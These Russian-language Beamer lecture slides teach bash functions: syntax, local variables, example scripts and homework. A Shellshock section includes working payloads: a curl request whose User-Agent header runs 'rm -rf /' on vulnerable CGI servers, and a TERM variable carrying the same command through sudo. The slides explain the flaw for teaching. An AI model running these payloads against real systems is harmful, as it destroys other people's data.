\begin{frame}
	\frametitle{Функции}

	\begin{itemize}
		\item Именованные
		\item Неименованные
	\end{itemize}

	Функции в shell могут использоваться как обычные программы, которые:
	\begin{itemize}
		\item Принимают позиционные параметры;
		\item возвращают статус;
		\item Могут использоваться в качестве источника либо приемника 
			при перенаправлениях ввода/вывода.
	\end{itemize}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Функции: синтаксис}
	\begin{itemize}
		\item Классический синаксис: 
			\begin{lstlisting}
function function_name {
  command...
}
\end{lstlisting}
		\item Портабельный (C-style):
			\begin{lstlisting}
function_name()
{
  command...
} 
\end{lstlisting}

		\item Однострочный:
			\begin{lstlisting}
function_name () { command... ;}
\end{lstlisting}
  \end{itemize}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Пример: shellshock}
	\begin{block}{Однострочный синтаксис}
			\begin{lstlisting}
function_name () { command... ;}
\end{lstlisting}
	\end{block}

    В 2014 году вскрылась уязвимость, существовавшая с {\bf 1992} г.:

	\begin{block}{Shellshock}
			\begin{lstlisting}
export badvar='(){:;}; echo "The Matrix has you"'
bash -c "echo Just a simple shell call"
\end{lstlisting}
	\begin{itemize}
	    \item Объявление переменной
	    \item Создание процесса, наследующего опасную переменную
	    \item При инициализации окружения {\tt bash} запускает на выполнение все, что следует за ``объявлением'' функции
	\end{itemize}
	\end{block}

\end{frame}

	\begin{block}{Пример использования}
	На любой уязвимый сайт с CGI-скриптами:
			\begin{lstlisting}
curl -H "User-Agent: () { :; }; /bin/rm -rf /" http://example.com/
\end{lstlisting}
	 В CGI все заголовки преобразуются в переменные окружения.
	\end{block}

	\begin{block}{Пример использования 2}
	Для любой команды {\tt sudo}
			\begin{lstlisting}
TERM='() { :; }; /bin/rm -rf / ' sudo mount /dev/cdrom
\end{lstlisting}
	Переменная {\tt TERM} не преобразуется и не сбрасывается.
	\end{block}



\begin{frame}[fragile]
	\frametitle{Пример (начало)}
	\small
	\begin{lstlisting}
#!/bin/bash

function help {
  echo "Использование: $0 <string>"
  exit 1
}

f1(){
  echo Вызвана функция $FUNCNAME с $# аргументами
}

f2(){
  while read str; do
    echo ${FUNCNAME}: прочитана строка: $str
  done
}
\end{lstlisting}

\end{frame}



\begin{frame}[fragile]
	\frametitle{Пример (окончание)}
	\small
	\begin{lstlisting}
[ $# -eq 0 ] && help

f1 "$@"

{ for ((i=0;i<5;i++));do
  echo $@
done } | f2

exit
\end{lstlisting}

\end{frame}

\begin{frame}[fragile]
	\frametitle{локальные переменные}

	Переменные объявленные с префиксом {\tt local} видны только внутри объявленного блока.

	\small
	\begin{columns}
		\column{0.5\textwidth}
		\begin{lstlisting}
#!/bin/bash

VAR=test
f1(){
  local VAR=test1
  echo Function ${FUNCNAME}: VAR=$VAR
}
f2(){
  VAR=test2
  echo Function ${FUNCNAME}: VAR=$VAR
}
		\end{lstlisting}
		\column{0.5\textwidth}	
		\begin{lstlisting}

echo Before f1: VAR=$VAR
f1
echo Before f2: VAR=$VAR
f2
echo After f2: VAR=$VAR

exit
\end{lstlisting}
	\end{columns}

\end{frame}

\begin{frame}
	\frametitle{Домашнее задание}
	\begin{itemize}
		\item Создать библиотеку функций:
			\begin{itemize}
				\item функция {\tt help};
				\item функция {\tt count\_str} -- подсчитывает количество найденных строк в stdin.
				\item функция {\tt readfile}, в которую передается имя файла в качестве 1 параметра
					и строка, которую необходимо найти, в качестве 2-го.
					Задача функции -- вырезать из файла все пустые строки и комментарии, 
					и с помощью предыдущей функции вернуть количество вхождений искомой строки.
			\end{itemize}
		\item Создать скрипт, который обрабатывает файл переданный через параметр -f или -{}-file;
		\item Включить библиотеку в свой скрипт с помощью {\tt source};
		\item Найти количество сервисов {\tt tcp} в файле {\tt /etc/services};
		\item Найти количество сервисов {\tt udp} в файле {\tt /etc/services};
  \end{itemize}
\end{frame}

